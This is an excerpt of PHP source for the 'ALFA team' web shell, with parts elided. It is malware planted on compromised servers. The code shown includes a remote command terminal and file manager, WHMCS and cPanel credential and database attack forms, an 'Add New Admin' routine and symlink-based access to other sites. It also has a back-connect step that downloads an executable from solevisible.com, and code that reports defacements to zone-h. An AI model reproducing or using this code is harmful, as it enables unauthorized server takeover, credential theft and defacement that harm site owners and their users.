...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://solevisible.com/images/alfa-iran.png" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		if($is_curl){
			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "https://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
			$post = new AlfaCURL();
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://solevisible.com/images/alfa-iran.png" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['alfamini']='https://solevisible.com/images/alfamini.png';
	$s['loader']='https://solevisible.com/images/loader.svg';
...
$site = str_replace(array('https://','https://','www.','ftp://'),'',$_POST['alfa1']);
$target = 'https://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$site;
...
foreach(array('https://','https://','ftp://') as $val)echo('<option value="'.$val.'">'.$val.'</option>');
...
$target = str_replace(array('https://','https://','ftp://'),'',$_POST['alfa1']);
$port = $_POST['alfa2'];
...
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Path WHMCS Url : ', 'inputName' => 'path', 'inputValue' => 'https://site.com/whmcs', 'inputSize' => '50'),
 'td2' =>
...
$dbn = $_POST['alfa7'];
$dbp = $_POST['alfa8'];
$dbh = $_POST['alfa9'];$path = $_POST['alfa10'];
$method = $_POST['alfa4'];
...
if($res){
$ff = 'https://'.$realurl.$realpath."/solevisible.php";
output($ff);
}else{
$ff = 'https://'.$realurl.$realpath."/calendar.php";
$fff = 'https://'.$realurl.$realpath."/solevisible.php";
...
$ff = 'https://'.$realurl.$realpath.$faq_file;
$fff = 'https://'.$realurl.$realpath."/solevisible.php";
...
function alfacheckupdate(){
	...
	if(function_exists("curl_version")){
		$update = new AlfaCURL();
		$json = $update->Send("https://solevisible.com/update.json?ver=".__ALFA_VERSION__);
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='https://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
<div id='rightclick_menu'>
  ...
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"https://solevisible.com/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"https://solevisible.com/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"https://solevisible.com/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"https://solevisible.com/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"https://solevisible.com/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"https://solevisible.com/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"permission\");' name='permission'><img src=\"https://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"https://solevisible.com/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"https://solevisible.com/icons/menu/increase.svg\"> Extract</a>
  <a href='javascript:void(0);' name='delete'><img src=\"https://solevisible.com/icons/menu/delete.svg\"> Delete</a>
</div>
...
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'https://site.com/whmcs', 'inputSize' => '50'),
 'td3' =>
...
$rep = str_replace(array("https://","https://","www."),"",$site);
$user = "";
...
if($lang=='bcwin'){
$alfa = new AlfaCURL();
$s = $alfa->Send('https://solevisible.com/bc/windows.exe');
$tmpdir = ALFA_TEMPDIR;
...
$alfa->Send("https://www.zone-h.com/notify/single","post","defacer=".$hacker."&domain1=". $sites[$i]."&hackmode=".$method."&reason=".$neden);
++$i;
}
...
alfahead();echo '<div class=header><center><br><div class="txtfont_header">| Add New Admin |</div>
<center><h3>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="https://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
		...
		if(!empty($source_page)){
			...
			if(!empty($matched_form)){
				...
				if($panel == "cpanel"){
					...
					$target = str_replace(array("https://", "https://"), "", $target);
					$port = explode(":",$target);
					$port = $port[1];
				}
				if(substr($uri, 0, 1) == "/"){
...
echo '<td align="center" style="background-color: black;"><a style="text-decoration: none;" target="_blank" href="https://php.net/manual/en/function.'.str_replace('_','-',$s).'.php"><span class="disable_functions"><b>'.$s.'</b></span></a></td>';
$i++;
}
echo '</table></center>';
echo '</div>';
...
function alfaget_flags(){
	...
	if(function_exists("curl_version")){
		...
		$flag = $curl->Send("https://www.geoplugin.net/json.gp?ip=" . $server_addr);
		$flag2 = $curl->Send("https://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
